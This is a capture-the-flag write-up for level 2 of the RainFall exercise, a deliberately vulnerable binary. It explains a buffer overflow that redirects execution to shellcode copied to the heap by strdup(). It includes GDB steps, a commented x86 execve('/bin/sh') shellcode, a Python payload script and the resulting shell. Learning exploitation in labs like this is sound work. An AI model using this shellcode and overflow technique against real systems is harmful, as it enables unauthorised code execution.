<h1 align="center"> LEVEL 2 </h1>

## 🔍 Analysis of Decompiled [level2](./source.c)
since stack has execution protection this is a heap overflow, we execute shellcode from the heap using strdup().

Exploit Strategy:</br>

Inject shellcode into local_50 buffer:
  - strdup(local_50) copies this shellcode to heap at a predictable address (found via GDB).
  - Overflow RET to point to the heap address returned by strdup().
  - When p() returns → EIP = heap → shellcode executes → /bin/sh spawns.

Why This Works?</br>

NX disabled → heap is executable(Check only blocks stack addresses, not heap).</br>
ASLR (Address Space Layout Randomization) is disabled.
```sh
level2@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
```
ASLR off → heap address is stable (e.g., `0x0804a008`).
strdup() gives us a writable+executable space for shellcode.

Find heap address after strdup() using GDB:
```
(gdb) b p
(gdb) r
(gdb) disass p
...
0x08048535 <+97>:	mov    %eax,(%esp)
0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
0x0804853d <+105>:	leave  
0x0804853e <+106>:	ret  
(gdb) break *0x0804853d
(gdb) run < <(python exploit.py)
(gdb) info registers
```
## 💥 Exploit 

Shellcode: 25-byte Linux x86 execve("/bin/sh").
```sh
shellcode = (
    "\x31\xc0"          # xor eax,eax        ; clear eax
    "\x50"              # push eax           ; push NULL
    "\x68\x2f\x2f\x73\x68" # push "//sh"
    "\x68\x2f\x62\x69\x6e" # push "/bin"
    "\x89\xe3"          # mov ebx,esp        ; ebx -> "/bin//sh"
    "\x50"              # push eax           ; push NULL (argv terminator)
    "\x53"              # push ebx           ; push pointer to "/bin//sh"
    "\x89\xe1"          # mov ecx,esp        ; ecx -> argv[]
    "\x99"              # cdq                ; edx = 0
    "\xb0\x0b"          # mov al,0xb         ; syscall number for execve
    "\xcd\x80"          # int 0x80           ; syscall
)

[ shellcode ....... ]   (goes into heap by strdup)
[ padding AAAAA... ]    (76 bytes, fills stack buffer)
[ BBBB             ]    (overwrites saved EBP)
[ 0x0804a008       ]    (overwrites RET with heap addr)
```
Padding to 76 bytes.</br>
Overwrite EBP (4 bytes).</br>
Overwrite RET with heap address.
```py
from struct import pack
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)
heap_addr = 0x0804a008
payload  = shellcode
payload += "A" * (76 - len(shellcode))
payload += "B" * 4
payload += pack("<I", heap_addr)
print(payload)
```
```sh
(python exploit.py; cat) | ./level2
 whoami
 level3
```